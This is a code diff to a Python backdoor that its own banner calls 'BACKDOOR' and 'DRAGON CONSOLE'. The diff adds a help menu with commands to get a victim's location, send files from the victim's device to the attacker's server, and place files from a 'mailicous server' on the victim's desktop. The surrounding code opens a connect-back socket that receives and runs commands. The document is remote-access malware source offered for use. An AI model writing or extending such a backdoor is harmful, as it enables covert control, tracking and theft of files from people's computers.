@@ -9,6 +9,36 @@ SERVER_URL = "http://192.168.88.105:2020"
 import shlex
 import pyautogui
 import random
+banner = r"""
+██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
+██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
+██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
+██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
+██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
+╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+
+                      DRAGON CONSOLE
+
+                 /\                 /\
+                / \'\._   (\_/)   _.'/ \
+               /_.''._'--('.')--'_.''._\
+               | \_ / `;=/ " \=;` \ _/ |
+                \/ `\__|`\___/`|__/`  \/
+                    /   /  \   \
+
+======================[ HELP ]=======================
+  [help]
+      - Show this help menu.
+  [get-location]
+      - Get victim location.
+  [exit]
+      - Exit from victim's device.
+  [send example.txt example2.txt]
+      - Send many file to your server from victim's device.
+   [put-files-desktop example1.txt example2.txt]
+      - Put files on victim's device from your mailicous server.
+=====================================================
+"""
 def put_files_in_desktop(args):
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
@@ -128,11 +158,14 @@ def open_pdf():
 def connect_back():
     s = socket.socket()
     s.connect(("IP", "PORT"))
+    s.send(banner.encode())
     while True:
         try:
             cmd = s.recv(1024).decode("utf-8").strip()
             if not cmd:
                 continue
+            if cmd.lower() == "help":
+                s.send(banner.encode())
             if cmd.lower().startswith("put-files-desktop"):
                 args_files = cmd.split()
                 put_files_in_desktop(args_files)
